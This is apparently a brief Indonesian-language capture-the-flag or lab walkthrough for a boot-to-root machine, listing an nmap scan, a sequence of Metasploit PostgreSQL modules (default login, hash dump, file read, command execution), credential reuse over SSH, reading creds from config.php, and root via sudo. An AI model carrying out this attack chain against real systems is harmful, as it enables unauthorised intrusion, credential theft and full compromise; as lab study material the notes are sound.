# boot:
1. scan nmap -> ada ssh http ama postgres
2. cari exploit postgres -> msfconsole search postgres -> ada user login
3. dapet postgres:password 
4. pake ini selanjutnya -> auxiliary/admin/postgres/postgres_sql
5. dapet versi nya
6. next kesini -> auxiliary/scanner/postgres/postgres_hashdump
7. next ini -> auxiliary/admin/postgres/postgres_readfile
8. next ini -> exploit/multi/postgres/postgres_copy_from_program_cmd_exec
9. dapet shell di /home/dark ada creds -> ssh aja kesana
10. ke /var/www/html -> ada config.php cat aja -> ada creds alison su aja

# pe :
1. sudo -l -> all all gada -> sudo bash atau sudo su  sebenernya bisa root
